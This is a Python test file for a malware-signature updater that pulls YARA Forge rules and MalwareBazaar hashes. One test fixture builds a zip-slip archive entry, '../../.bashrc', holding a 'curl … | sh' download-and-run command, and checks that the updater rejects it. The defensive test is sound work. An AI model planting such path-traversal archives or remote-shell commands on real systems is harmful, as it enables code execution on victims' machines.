import hashlib
import io
import json
import zipfile

import pytest

from guardiao import bases
from guardiao.fontes import yara_forge

pytest.importorskip("yara_x")

REGRAS = "\n".join(f'rule R{i} {{ meta: score = 75 strings: $a = "marca{i}" condition: $a }}' for i in range(1200))


def zip_com(membros: dict[str, str]) -> bytes:
    dados = io.BytesIO()
    with zipfile.ZipFile(dados, "w") as z:
        for nome, texto in membros.items():
            z.writestr(nome, texto)
    return dados.getvalue()


@pytest.fixture
def github(monkeypatch):
    """Finge a API do GitHub e o download do pacote."""
    estado = {"tag": "20261103", "pacote": zip_com({yara_forge.MEMBRO: REGRAS}), "digest": None}

    def baixar(url, destino, cabecalhos=None, limite=0):
        if url == yara_forge.API:
            digest = estado["digest"] or hashlib.sha256(estado["pacote"]).hexdigest()
            corpo = json.dumps({"tag_name": estado["tag"], "assets": [
                {"name": yara_forge.PACOTE, "browser_download_url": "https://exemplo/pacote.zip",
                 "digest": f"sha256:{digest}"}]}).encode()
        else:
            corpo = estado["pacote"]
        destino.write_bytes(corpo)
        return hashlib.sha256(corpo).hexdigest()

    monkeypatch.setattr(yara_forge, "baixar_arquivo", baixar)
    return estado


def test_baixa_valida_e_instala(github):
    [r] = bases.atualizar([yara_forge.YaraForge()], agora=1000)
    assert r.situacao == "atualizada" and r.estado.versao == "20261103"
    pasta = bases.atual("yara-forge")
    assert sorted(p.name for p in pasta.iterdir()) == ["regras.yar"]   # sem sobras do download


def test_mesma_release_nao_baixa_de_novo(github):
    base = yara_forge.YaraForge()
    bases.atualizar([base], agora=1000)
    github["pacote"] = b"nem devia ser lido"
    assert bases.atualizar([base], agora=1000 + 2 * 86400)[0].situacao == "sem novidades"


@pytest.mark.parametrize("estrago", ["digest", "zip_malicioso", "poucas_regras", "nao_compila"])
def test_pacote_ruim_e_recusado(github, estrago):
    if estrago == "digest":
        github["digest"] = "0" * 64   # chegou algo diferente do que o GitHub publicou
    elif estrago == "zip_malicioso":
        github["pacote"] = zip_com({"../../.bashrc": "curl ruim | sh"})
    elif estrago == "poucas_regras":
        github["pacote"] = zip_com({yara_forge.MEMBRO: "rule So_Uma { condition: false }"})
    else:
        github["pacote"] = zip_com({yara_forge.MEMBRO: REGRAS + "\nrule { quebrada"})
    [r] = bases.atualizar([yara_forge.YaraForge()], agora=1000)
    assert r.situacao == "erro" and bases.atual("yara-forge") is None


# --- MalwareBazaar -------------------------------------------------------------------

from guardiao import assinaturas  # noqa: E402
from guardiao.fontes import malwarebazaar  # noqa: E402

CABECALHO = (
    "################################################################\n"
    "# MalwareBazaar recent malware samples (CSV)                   #\n"
    '# "first_seen_utc","sha256_hash","md5_hash","sha1_hash","reporter","file_name",'
    '"file_type_guess","mime_type","signature","clamav","vtpercent","imphash","ssdeep","tlsh"\n'
)


def linha(sha, assinatura="Mirai", tipo="elf"):
    return (f'"2026-11-03 10:00:00", "{sha}", "m", "s", "pesquisador", "x.bin", "{tipo}", '
            f'"application/x-executable", "{assinatura}", "n/a", "n/a", "n/a", "n/a", "n/a"\n')


@pytest.fixture
def bazaar(monkeypatch):
    estado = {"csv": CABECALHO + linha("a" * 64) + linha("b" * 64, "n/a", "exe"), "pedidos": []}

    def baixar(url, destino, cabecalhos=None, limite=0, rotulo=None):
        estado["pedidos"].append(url)
        if estado.get("falha"):
            raise OSError(f"HTTP Error 403 em {url}")
        destino.write_text(estado["csv"])
        return hashlib.sha256(estado["csv"].encode()).hexdigest()

    monkeypatch.setattr(malwarebazaar, "baixar_arquivo", baixar)
    monkeypatch.setenv("GUARDIAO_MALWAREBAZAAR_CHAVE", "chave-secreta-123")
    return estado


def banco_atual():
    return assinaturas.Banco({}, fontes=[bases.atual("malwarebazaar") / assinaturas.NOME_SQLITE])


def test_le_o_csv_com_familia_ou_tipo(tmp_path):
    arquivo = tmp_path / "recent.csv"
    arquivo.write_text(CABECALHO + linha("A" * 64) + linha("b" * 64, "n/a", "exe") + "lixo sem hash\n")
    assert list(malwarebazaar.ler_csv(arquivo)) == [
        ("A" * 64, "MalwareBazaar.Mirai"), ("b" * 64, "MalwareBazaar.exe")]


def test_acumula_os_hashes_das_ultimas_48h(bazaar):
    base = malwarebazaar.MalwareBazaar()
    bases.atualizar([base], agora=1000)
    bazaar["csv"] = CABECALHO + linha("c" * 64, "AgentTesla")   # 'a' e 'b' saíram da janela de 48 h
    bases.atualizar([base], agora=1000 + 3600)
    banco = banco_atual()
    assert len(banco) == 3 and banco.get("a" * 64) == "MalwareBazaar.Mirai"
    assert banco.get("c" * 64) == "MalwareBazaar.AgentTesla"


def test_chave_nunca_aparece_no_erro(bazaar):
    bazaar["falha"] = True
    [r] = bases.atualizar([malwarebazaar.MalwareBazaar()], agora=1000)
    assert r.situacao == "erro" and "chave-secreta-123" not in r.estado.erro
    assert "chave-secreta-123" not in (bases.pasta_da("malwarebazaar") / "estado.json").read_text()


def test_sem_chave_a_fonte_fica_desligada(monkeypatch):
    monkeypatch.delenv("GUARDIAO_MALWAREBAZAAR_CHAVE", raising=False)
    assert [b.nome for b in bases.registradas()] == ["yara-forge"]
    monkeypatch.setenv("GUARDIAO_MALWAREBAZAAR_CHAVE", "x")
    assert [b.nome for b in bases.registradas()] == ["yara-forge", "malwarebazaar"]


def test_hashes_novos_nao_zeram_o_cache(bazaar):
    from guardiao import cache
    antes = cache.versao_motor()
    bases.atualizar([malwarebazaar.MalwareBazaar()], agora=1000)
    assert cache.versao_motor() == antes   # a reconferência do hash guardado cuida disso
